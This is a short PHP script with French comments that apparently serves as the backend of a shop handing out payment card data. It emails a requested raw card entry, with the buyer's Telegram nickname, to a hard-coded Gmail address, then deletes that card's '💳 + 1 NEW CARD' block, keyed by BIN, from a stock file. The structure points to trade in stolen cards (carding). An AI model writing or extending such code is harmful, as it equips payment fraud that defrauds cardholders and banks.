<?php
// delete_card.php

// Config
$to = "baranostop28@gmail.com";
$subject = "Demande de carte";

$data = json_decode(file_get_contents('php://input'), true);
if (!$data || !isset($data['bin'], $data['pseudo'], $data['raw'])) {
    echo json_encode(['success'=>false, 'error'=>'Données invalides']);
    exit;
}

$bin = preg_quote($data['bin'], '/');
$pseudo = strip_tags(trim($data['pseudo']));
$rawCard = trim($data['raw']);

// Préparer le mail
$message = "Carte demandée :\n\n$rawCard\n\nPseudo Telegram : $pseudo\n";
$headers = "From: no-reply@tonsite.com\r\n";

// Envoi mail
if(!mail($to, $subject, $message, $headers)){
    echo json_encode(['success'=>false, 'error'=>'Erreur envoi mail']);
    exit;
}

// Suppression de la carte dans cards.txt
$file = 'cards.txt';
$content = file_get_contents($file);
if ($content === false) {
    echo json_encode(['success'=>false, 'error'=>'Fichier introuvable']);
    exit;
}

// Supprime la carte complète (depuis "💳 + 1 NEW CARD" + BIN et tout ce qui suit jusqu'à la prochaine carte)
$pattern = '/💳 \+ 1 NEW CARD\s*└ '.$bin.'[\s\S]*?(?=💳 \+ 1 NEW CARD|$)/m';

$newContent = preg_replace($pattern, '', $content, 1);

if ($newContent === null) {
    echo json_encode(['success'=>false, 'error'=>'Erreur regex']);
    exit;
}

file_put_contents($file, $newContent);

echo json_encode(['success'=>true]);
